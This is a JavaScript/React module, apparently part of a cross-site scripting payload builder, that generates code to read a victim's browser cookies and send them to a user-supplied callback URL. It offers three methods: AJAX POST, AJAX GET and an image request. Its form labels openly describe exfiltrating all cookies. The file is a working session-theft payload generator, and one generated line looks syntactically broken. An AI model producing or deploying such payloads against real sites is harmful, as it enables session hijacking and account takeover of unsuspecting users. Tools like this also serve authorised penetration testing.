import React from 'react'
import RecipeCheckBox from '~/components/RecipeCheckBox'
import RecipeTextField from '~/components/RecipeTextField'

export function cook (instance, vars) {
  let cookieSelection = 'var c = document.cookie'

  if (instance.cookie) {
    cookieSelection = `var c = document.cookie.match(new RegExp('(^| )${instance.cookie}=([^;]+)'));)[2]`
  }

  let callbackName = `${instance.id}_cb`
  let callback = `var ${callbackName} = function () { }`
  if (instance.waitForResponse) {
    callback = `var ${callbackName} = function () { __XSS_CHEF_ENTRY_POINT__ }`
  }

  let submission = ''
  if (instance.method === 'post:ajax') {
    submission = `ajaxRequest('POST', '${instance.callbackUrl}', 'cookie=' + encodeURIComponent(c), ${callbackName})`
  } else if (instance.method === 'get:dom') {
    submission = [
      'var i = new Image()',
      `i.src = '${instance.callbackUrl}?c=' + encodeURIComponent(c)`,
      `${callbackName}()`
    ].join('\n')
  } else if (instance.method === 'get:ajax') {
    submission = `ajaxRequest('GET', '${instance.callbackUrl}?c=' + encodeURIComponent(c), undefined, ${callbackName})`
  }

  let eof = ''
  if (!instance.waitForResponse) {
    eof = '__XSS_CHEF_ENTRY_POINT__'
  }

  const payload = [
    callback,
    cookieSelection,
    submission,
    eof
  ].join('\n')

  return {
    payload: vars.payload.replace(/__XSS_CHEF_ENTRY_POINT__/g, payload)
  }
}

export function init () {
  return {
    callbackUrl: '',
    method: 'post:ajax',
    waitForResponse: true
  }
}

export function render (instance, setRecipeProperty) {
  return (
    <div>
      <RecipeTextField
        bindTo="callbackUrl"
        instance={instance}
        label="Callback URL"
        placeholder="Example: http://your.domain.com/cookie"
        setRecipeProperty={setRecipeProperty}
      />

      <RecipeTextField
        bindTo="cookie"
        instance={instance}
        label="Cookie Name (Optional)"
        placeholder="(Leave blank to exfiltrate all cookies)"
        setRecipeProperty={setRecipeProperty}
      />

      <div className="form-group">
        <label htmlFor={`${instance.id}-method`}>Exfiltration Method</label>
        <select id={`${instance.id}-method`}
          className="form-control"
          value={instance.method}
          onChange={(e) => setRecipeProperty(
            instance.id,
            'method',
            e.target.value
          )}>
          <option value="get:ajax">GET: AJAX</option>
          <option value="get:dom">GET: DOM</option>
          <option value="post:ajax">POST: AJAX</option>
        </select>
      </div>

      <RecipeCheckBox
        bindTo="waitForResponse"
        instance={instance}
        label="Halt next operation until response is received"
        setRecipeProperty={setRecipeProperty}
      />
    </div>
  )
}

export function validate (instance) {
  if (instance.callbackUrl === '') {
    return false
  }

  return true
}
